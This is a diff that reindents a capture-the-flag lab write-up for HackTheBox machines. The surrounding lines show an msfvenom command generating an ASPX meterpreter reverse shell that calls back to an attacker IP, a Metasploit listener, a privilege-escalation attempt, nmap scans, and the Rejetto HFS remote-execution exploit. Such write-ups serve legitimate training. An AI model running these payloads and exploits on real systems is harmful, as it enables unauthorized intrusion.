@@ -81,7 +81,7 @@ PORT   STATE SERVICE
     We can try to upload an ASPX reverse shell, and see if IIS will execute it and give us access to the machine. We can create a meterpreter reverse shell as:
     *$msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.120 LPORT=1234 -f aspx > shell.aspx*
 
-        We listen for incoming connections using:
+    We listen for incoming connections using:
     *$ msfconsole
 > use exploit/multi/handler
 > set PAYLOAD windows/meterpreter/reverse_tcp
@@ -93,7 +93,7 @@ PORT   STATE SERVICE
     Elevation of privileges: First, we find out our current user.
     *> getuid
 Server username: IIS APPPOOL\Web*
-        We can try to get SYSTEM by using common techniques, but as expected is fails:
+    We can try to get SYSTEM by using common techniques, but as expected is fails:
     *> getsystem
 [-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
 [-] Named Pipe Impersonation (In Memory/Admin)
@@ -152,7 +152,7 @@ e621a0b5041708797c4fc4728bc72b4b*
 
 Optimum 10.10.10.8
     Reconnaissance
-        Same methodology as carried out in previous machines, quick syn port scan:
+    Same methodology as carried out in previous machines, quick syn port scan:
     *root@kali:~# nmap -T5 -sS 10.10.10.8
 
 Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-19 15:15 BST
@@ -161,7 +161,7 @@ Host is up (0.030s latency).
 Not shown: 999 filtered ports
 PORT   STATE SERVICE
 80/tcp open  http*
-        Service identification:
+    Service identification:
     *# nmap -A 10.10.10.8 -p 80
 
 Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-19 15:17 BST
@@ -185,7 +185,7 @@ Matching Modules
    ----                                   ---------------  ----       -----------
    exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Rejetto HttpFileServer Remote Command Execution*
 
-        It is our lucky day:
+    It is our lucky day:
     *msf > use exploit/windows/http/rejetto_hfs_exec
 msf exploit(rejetto_hfs_exec) > info
 
